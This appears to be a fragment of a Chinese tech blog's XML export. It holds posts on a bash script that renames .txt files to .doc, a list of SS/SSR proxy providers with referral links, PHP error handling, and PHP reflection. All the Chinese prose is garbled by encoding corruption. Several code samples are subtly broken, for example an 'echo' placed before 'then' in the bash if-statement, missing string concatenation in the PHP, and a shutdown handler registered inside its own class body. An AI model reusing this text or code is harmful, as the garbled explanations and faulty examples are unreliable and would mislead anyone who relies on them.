class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"><span class="comment"># å°†æŒ‡å®šç›®å½•ä¸‹(å‚æ•°ä¼ é€’$1)çš„æ‰€æœ‰ä»¥.txtä¸ºåç¼€çš„æ–‡ä»¶æ›´åä¸º*.doc</span></span><br><span class="line">directory=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span> [ ! <span class="variable">$directory</span> ]</span><br><span class="line">  <span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">&quot;please input the argument directory&quot;</span></span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">files=`ls <span class="variable">$&#123;directory&#125;</span>`</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$files</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [ -f <span class="variable">$&#123;file&#125;</span> ]</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$file</span></span><br><span class="line">    <span class="keyword">then</span></span><br><span class="line">    suffix=<span class="variable">$&#123;file#*\.&#125;</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$suffix</span></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$suffix</span> == <span class="string">&quot;txt&quot;</span> ]]</span><br><span class="line">      <span class="keyword">then</span></span><br><span class="line">      prefix=<span class="variable">$&#123;file%\.*&#125;</span></span><br><span class="line">      mv <span class="variable">$directory</span>/<span class="variable">$file</span> <span class="variable">$directory</span>/<span class="variable">$prefix</span>.doc</span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="å‡½æ•°"><a href="#å‡½æ•°" class="headerlink" title="å‡½æ•°"></a>å‡½æ•°</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">functionname</span></span>() &#123;</span><br><span class="line">    å‘½ä»¤åˆ—è¡¨</span><br><span class="line">    <span class="built_in">return</span></span><br><span class="line">&#125;</span><br><span class="line">å‡½æ•°çš„è°ƒç”¨æ–¹å¼ä¸ºï¼š</span><br><span class="line">functionname arguments</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SS/SSRæä¾›å•†</title>
      <link href="post/39062/"/>
      <url>post/39062/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>è‡ªå·±ç»å¸¸ç”¨çš„ä¸€äº›æ¢¯å­ï¼Œä¸”ç”¨ä¸”çæƒœ</p><span id="more"></span><h3 id="SuperSTAR"><a href="#SuperSTAR" class="headerlink" title="SuperSTAR"></a>SuperSTAR</h3><p>ç™½å«–å…¬ç›Šæœºåœºï¼Œæ¯æœˆ100Gï¼Œä¸é™é€Ÿï¼Œè¿˜è¦å•¥è‡ªè¡Œè½¦</p><p>æ³¨å†Œåœ°å€: <a href="https://srayx.com/#/register?code=flzfKPoM">https://srayx.com/#/register?code=flzfKPoM</a></p><h3 id="MENGDI-Cloud"><a href="#MENGDI-Cloud" class="headerlink" title="MENGDI-Cloud"></a>MENGDI-Cloud</h3><p>è€ç‰Œæœºåœºï¼Œç»´æŒå¤šå¹´ï¼Œç°å·²æ¥å…¥å°æ¹¾HINETä¸­åç”µä¿¡,é¦™æ¸¯HKTã€WTTã€HKBNã€HGCã€é˜¿é‡Œäº‘CN2ã€ä¿„ç½—æ–¯ä¼¯åŠ›ã€éŸ©å›½KTã€SKã€LGã€azureã€æ–°åŠ å¡CN2ã€ç¾å›½CN2ã€é¦™æ¸¯azureã€æ—¥æœ¬IIJã€è½¯é“¶,é«˜è¾¾1Gbpsæ•°æ®ä¼ è¾“æœ€å¤§å…¨åŠ›ä¿è¯å¤§é™†å®½å¸¦,æ——ä¸‹ç«™ç‚¹X-AIRä¸»è¦è¿è¥V2rayåŠ é€Ÿ</p><p>æ³¨å†Œåœ°å€ï¼š<a href="https://dash.nexthud.com/aff/?code=XdZQ">https://dash.nexthud.com/aff/?code=XdZQ</a></p><h3 id="Suda-Cloud"><a href="#Suda-Cloud" class="headerlink" title="Suda Cloud"></a>Suda Cloud</h3><p>ä»·æ ¼å®æƒ ï¼Œæ”¯æŒæŒ‰é‡ä»˜è´¹ï¼Œç•Œé¢å°æ¸…æ–°ï¼Œé€Ÿåº¦è¿˜å¯ä»¥</p><p>æ³¨å†Œåœ°å€: <a href="https://v2.suda.moe/auth/register?code=GLMx">https://v2.suda.moe/auth/register?code=GLMx</a></p><h3 id="Dler-Cloud"><a href="#Dler-Cloud" class="headerlink" title="Dler Cloud"></a>Dler Cloud</h3><p>æœ‰ç‚¹å°è´µï¼ŒåŠŸèƒ½å¼ºå¤§ï¼ŒæœºåœºåŒ…æ‹¬éƒ¨åˆ†ä¸­ç»§èŠ‚ç‚¹ï¼Œæ¸¯å°æ—¥ç­‰åœ°åŒºèŠ‚ç‚¹ä¹ŸæŒºå¤šï¼Œ150+èŠ‚ç‚¹ï¼ŒåŒ…æ‹¬å›½é™…æ ‡å‡†èŠ‚ç‚¹ã€å›½é™…é«˜çº§èŠ‚ç‚¹ã€å›½é™…ä¼˜åŒ–èŠ‚ç‚¹ã€ä¸­å›½å¤§é™†èŠ‚ç‚¹ç­‰ç­‰ã€‚</p><p>å®˜æ–¹ç½‘ç«™: <a href="https://dlercloud.com/">https://dlercloud.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> ç§‘å­¦ä¸Šç½‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPä¸­çš„é”™è¯¯å¤„ç†</title>
      <link href="post/30879/"/>
      <url>post/30879/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>PHPé‡Œæœ‰ä¸€å¥—é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œå¯ä»¥ä½¿ç”¨set_error_handleræ¥ç®¡PHPé”™è¯¯å¤„ç†ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨trigger_errorå‡½æ•°ä¸»åŠ¨æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚</p><span id="more"></span><h3 id="set-error-handler"><a href="#set-error-handler" class="headerlink" title="set_error_handler"></a>set_error_handler</h3><p>set_error_handler()å‡½æ•°è®¾ç½®ç”¨æˆ·è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ã€‚å‡½æ•°ç”¨äºåˆ›å»ºè¿è¡ŒæœŸé—´çš„ç”¨æˆ·è‡ªå·±çš„é”™è¯¯å¤„ç†æ–¹æ³•ã€‚å®ƒéœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªé”™è¯¯å¤„ç†å‡½æ•°ï¼Œç„¶åè®¾ç½®é”™è¯¯çº§åˆ«ã€‚è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_error_handler(error_function, error_type)</span><br></pre></td></tr></table></figure><ul><li>error_function :å‘ç”Ÿé”™è¯¯æ—¶è¿è¡Œçš„å‡½æ•°</li><li>error_type : é”™è¯¯çº§åˆ«ï¼Œé»˜è®¤ä¸ºE_ALL</li></ul><p>å¦‚æœä½¿ç”¨è¯¥å‡½æ•°ï¼Œä¼šå®Œå…¨ç»•è¿‡PHPé”™è¯¯å¤„ç†å‡½æ•°ï¼Œå¦‚æœæœ‰å¿…è¦ï¼Œè‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†ç¨‹åºå¿…é¡»ç»ˆæ­¢è„šæœ¬</p><p>å¦‚æœåœ¨è„šæœ¬æ‰§è¡Œå‰å‘ç”Ÿé”™è¯¯ï¼Œé‚£æ—¶è‡ªå®šä¹‰ç¨‹åºè¿˜æ²¡æœ‰æ³¨å†Œï¼Œå°±ä¸ä¼šç”¨åˆ°è‡ªå®šä¹‰é”™è¯¯å¤„ç†ç¨‹åº</p><h3 id="è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†"><a href="#è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†" class="headerlink" title="è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†"></a>è‡ªå®šä¹‰å¼‚å¸¸å¤„ç†</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;é”™è¯¯ä»£ç :&#x27;</span><span class="variable">$errno</span>.<span class="variable">$errstr</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;é”™è¯¯æ‰€åœ¨:&#x27;</span><span class="variable">$errfile</span>.<span class="variable">$errline</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_error_handler(customError, E_ALL|E_STRICT);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = [<span class="string">&#x27;o&#x27;</span> =&gt; <span class="number">2</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è‡ªå®šä¹‰çš„é”™è¯¯å¤„ç†å‡½æ•°ä¸€å®šè¦æœ‰è¿™å››ä¸ªè¾“å…¥å˜é‡ï¼„errnoã€ï¼„errstrã€ï¼„errfileã€ï¼„errline</p><p>errnoæ˜¯ä¸€ç»„å¸¸é‡ï¼Œä»£è¡¨é”™è¯¯çš„ç­‰çº§ï¼ŒåŒæ—¶ä¹Ÿæœ‰ä¸€ç»„æ•´æ•°å’Œå…¶å¯¹åº”ï¼Œä½†ä¸€èˆ¬ä½¿ç”¨å…¶å­—ç¬¦ä¸²å€¼è¡¨ç¤ºï¼Œè¿™æ ·è¯­ä¹‰æ›´å¥½ä¸€ç‚¹ã€‚æ¯”å¦‚E_WARNINGï¼Œå…¶äºŒè¿›åˆ¶æ©ç ä¸º4.ï¼Œè¡¨ç¤ºè­¦å‘Šä¿¡æ¯</p><p>æ¥ä¸‹æ¥ï¼Œå°±æ˜¯å°†è¿™ä¸ªå‡½æ•°ä½œä¸ºå›è°ƒå‚æ•°ä¼ é€’ç»™set_error_handlerã€‚è¿™æ ·å°±èƒ½æ¥ç®¡PHPåŸç”Ÿçš„é”™è¯¯å¤„ç†å‡½æ•°äº†ã€‚è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ç§æ‰˜ç®¡æ–¹å¼å¹¶ä¸èƒ½æ‰˜ç®¡æ‰€æœ‰ç§ç±»çš„é”™è¯¯ï¼Œå¦‚E_ERRORã€E_PARSEã€E_CORE_ERRORã€E_CORE_WARNINGã€E_COMPILE_ERRORã€E_COMPILE_WARNINGï¼Œä»¥åŠE_STRICTä¸­çš„éƒ¨åˆ†ã€‚è¿™äº›é”™è¯¯ä¼šä»¥æœ€åŸå§‹çš„æ–¹å¼æ˜¾ç¤ºï¼Œæˆ–è€…ä¸æ˜¾ç¤º</p><h3 id="restore-error-handler"><a href="#restore-error-handler" class="headerlink" title="restore_error_handler"></a>restore_error_handler</h3><p>set_error_handlerå‡½æ•°ä¼šæ¥ç®¡PHPå†…ç½®çš„é”™è¯¯å¤„ç†ï¼Œå¯ä»¥åœ¨åŒä¸€ä¸ªé¡µé¢ä½¿ç”¨restore_error_handler()ï¼›å–æ¶ˆæ¥ç®¡</p><p>å¦‚æœä½¿ç”¨è‡ªå®šä¹‰çš„set_error_handleræ¥ç®¡PHPçš„é”™è¯¯å¤„ç†ï¼Œä»£ç é‡Œçš„é”™è¯¯æŠ‘åˆ¶@å°†å¤±æ•ˆï¼Œè¿™ç§é”™è¯¯ä¹Ÿä¼šè¢«æ˜¾ç¤º</p><p>åœ¨PHPå¼‚å¸¸ä¸­ï¼Œå¼‚å¸¸å¤„ç†æœºåˆ¶æ˜¯æœ‰é™çš„ï¼Œæ— æ³•è‡ªåŠ¨æŠ›å‡ºå¼‚å¸¸ï¼Œå¿…é¡»æ‰‹åŠ¨è¿›è¡Œï¼Œå¹¶ä¸”å†…ç½®å¼‚å¸¸æœ‰é™ã€‚PHPæŠŠè®¸å¤šå¼‚å¸¸çœ‹ä½œé”™è¯¯ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠè¿™äº›â€œå¼‚å¸¸â€åƒé”™è¯¯ä¸€æ ·ç”¨set_error_handleræ¥ç®¡ï¼Œè¿›è€Œä¸»åŠ¨æŠ›å‡ºå¼‚å¸¸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">customError</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$errno</span>.<span class="string">&#x27;|&#x27;</span>.<span class="variable">$errstr</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_error_handler(<span class="string">&#x27;customError&#x27;</span>, E_ALL|E_STRICT);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="number">5</span>/<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±èƒ½æ•è·åˆ°å¼‚å¸¸å’Œéè‡´å‘½çš„é”™è¯¯ï¼Œå¯ä»¥å¼¥è¡¥PHPå¼‚å¸¸å¤„ç†æœºåˆ¶çš„éƒ¨åˆ†ä¸è¶³</p><h3 id="register-shutdown-function"><a href="#register-shutdown-function" class="headerlink" title="register_shutdown_function"></a>register_shutdown_function</h3><p>fetal errorè¿™æ ·çš„é”™è¯¯æ•è·ä¸åˆ°ï¼Œä¹Ÿæ— æ³•åœ¨å‘ç”Ÿæ­¤é”™è¯¯åæ¢å¤æµç¨‹å¤„ç†ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä½¿ç”¨ä¸€äº›ç‰¹æ®Šæ–¹æ³•å¯¹è¿™ç§é”™è¯¯è¿›è¡Œå¤„ç†ã€‚è¿™éœ€è¦ç”¨åˆ°<code>register_shutdown_function()</code></p><p>æ­¤å‡½æ•°ä¼šåœ¨PHPç¨‹åºç»ˆæ­¢æˆ–è€…dieæ—¶è§¦å‘ä¸€ä¸ªå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shutdown</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">stop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (error_get_last()) &#123;</span><br><span class="line">            print_r(error_get_last);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Stop&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    register_shutdown_function([<span class="keyword">new</span> Shutdown(), <span class="string">&#x27;stop&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> a();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;end&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯¹äºfetal errorè¿˜èƒ½åšç‚¹æ”¶å°¾å·¥ä½œï¼Œä½†æ˜¯PHPæµç¨‹çš„ç»ˆæ­¢æ˜¯å¿…ç„¶çš„ã€‚å¯¹äºParse errorçº§åˆ«çš„é”™è¯¯ï¼Œé™¤äº†å¯ä»¥ä¿®æ”¹é…ç½®æ–‡ä»¶php.iniï¼Œä»€ä¹ˆéƒ½åšä¸äº†</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">log_errors</span> = <span class="literal">On</span></span><br><span class="line"><span class="attr">error_log</span> = usr/log/php.log</span><br></pre></td></tr></table></figure><p>è¿™æ ·ä¸€æ—¦PHPå‘ç”Ÿäº†é”™è¯¯ï¼Œå°±ä¼šè¢«è®°å…¥logæ–‡ä»¶ï¼Œæ–¹ä¾¿ä»¥åæŸ¥è¯¢</p><h3 id="trigger-error"><a href="#trigger-error" class="headerlink" title="trigger_error"></a>trigger_error</h3><p>å’Œexceptionç±»ä¼¼ï¼Œé”™è¯¯å¤„ç†ä¹Ÿæœ‰å¯¹åº”æŠ›å‡ºé”™è¯¯çš„å‡½æ•°ï¼Œé‚£å°±æ˜¯trigger_errorå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$d</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$d</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    trigger_error(<span class="string">&#x27;cannot d by zero&#x27;</span>, E_USER_ERROR);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;break&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h3><p>åœ¨PHPä¸­ï¼Œé”™è¯¯å’Œå¼‚å¸¸æ˜¯ä¸¤ä¸ªä¸åŒçš„æ¦‚å¿µï¼Œè¿™ç§è®¾è®¡ä»æ ¹æœ¬ä¸Šå¯¼è‡´äº†PHPçš„å¼‚å¸¸å’Œå…¶ä»–è¯­è¨€ç›¸å¼‚ã€‚ä»¥Javaä¸ºä¾‹ï¼ŒJavaä¸­ï¼Œå¼‚å¸¸æ˜¯é”™è¯¯å”¯ä¸€çš„æŠ¥å‘Šæ–¹å¼ã€‚è¯´åˆ°åº•ï¼Œä¸¤è€…çš„åŒºåˆ«å°±æ˜¯å¯¹å¼‚å¸¸å’Œé”™è¯¯çš„è®¤è¯†ä¸åŒè€Œäº§ç”Ÿçš„ã€‚PHPçš„å¼‚å¸¸ç»å¤§éƒ¨åˆ†å¿…é¡»é€šè¿‡æŸç§åŠæ³•æ‰‹åŠ¨æŠ›å‡ºï¼Œæ‰èƒ½è¢«æ•è·åˆ°ï¼Œæ˜¯ä¸€ç§åŠè‡ªåŠ¨åŒ–çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ã€‚ æ— è®ºæ˜¯é”™è¯¯è¿˜æ˜¯å¼‚å¸¸ï¼Œéƒ½å¯ä»¥ä½¿ç”¨handleræ¥ç®¡ç³»ç»Ÿå·²æœ‰çš„å¤„ç†æœºåˆ¶</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPç±»åå°„</title>
      <link href="post/46494/"/>
      <url>post/46494/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­å¯¹è±¡è¢«èµ‹äºˆäº†è‡ªçœçš„èƒ½åŠ›ï¼Œè€Œè¿™ä¸ªè‡ªçœçš„è¿‡ç¨‹å°±æ˜¯åå°„ï¼Œåå°„ç›´è§‚çš„ç†è§£å°±æ˜¯æ ¹æ®åˆ°è¾¾åœ°æ‰¾å‡ºå‡ºå‘åœ°å’Œæ¥æº</p><p>åå°„æŒ‡åœ¨PHPè¿è¡ŒçŠ¶æ€ä¸­ï¼Œæ‰©å±•åˆ†æPHPç¨‹åºï¼Œåˆ°å¤„æˆ–æå–å‡ºç±»ï¼Œæ–¹æ³•ï¼Œå±æ€§ï¼Œå‚æ•°ç­‰è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ³¨é‡Š</p><span id="more"></span><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gender</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">say</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name <span class="string">&#x27;:&#x27;</span> <span class="keyword">$this</span>-&gt;gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;setting $name to $value&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;æœªè®¾ç½®&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;<span class="variable">$name</span> = <span class="string">&#x27;é»˜è®¤å€¼&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$student</span> = <span class="keyword">new</span> Person();</span><br><span class="line"></span><br><span class="line"><span class="variable">$student</span>-&gt;name = <span class="string">&#x27;Ton&#x27;</span>;</span><br><span class="line"><span class="variable">$student</span>-&gt;gender = <span class="string">&#x27;male&#x27;</span>;</span><br><span class="line"><span class="variable">$student</span>-&gt;age = <span class="string">&#x27;24&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨APIè·å–å±æ€§å’Œæ–¹æ³•"><a href="#ä½¿ç”¨APIè·å–å±æ€§å’Œæ–¹æ³•" class="headerlink" title="ä½¿ç”¨APIè·å–å±æ€§å’Œæ–¹æ³•"></a>ä½¿ç”¨APIè·å–å±æ€§å’Œæ–¹æ³•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–å¯¹è±¡å±æ€§åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$reflect</span> = <span class="keyword">new</span> ReflectionObject(<span class="variable">$student</span>);</span><br><span class="line"><span class="variable">$props</span> = <span class="variable">$reflect</span>-&gt;getProperties();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$props</span> <span class="keyword">as</span> <span class="variable">$prop</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$prop</span>-&gt;getName();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–å¯¹è±¡æ–¹æ³•åˆ—è¡¨</span></span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$reflect</span>-&gt;getMethods();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$m</span> <span class="keyword">as</span> <span class="variable">$prop</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$prop</span>-&gt;getName();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨classå‡½æ•°è·å–å±æ€§å’Œæ–¹æ³•"><a href="#ä½¿ç”¨classå‡½æ•°è·å–å±æ€§å’Œæ–¹æ³•" class="headerlink" title="ä½¿ç”¨classå‡½æ•°è·å–å±æ€§å’Œæ–¹æ³•"></a>ä½¿ç”¨classå‡½æ•°è·å–å±æ€§å’Œæ–¹æ³•</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è¿”å›å¯¹è±¡å±æ€§çš„å…³è”æ•°ç»„</span></span><br><span class="line">var_dump(get_object_vars(<span class="variable">$student</span>));</span><br><span class="line"><span 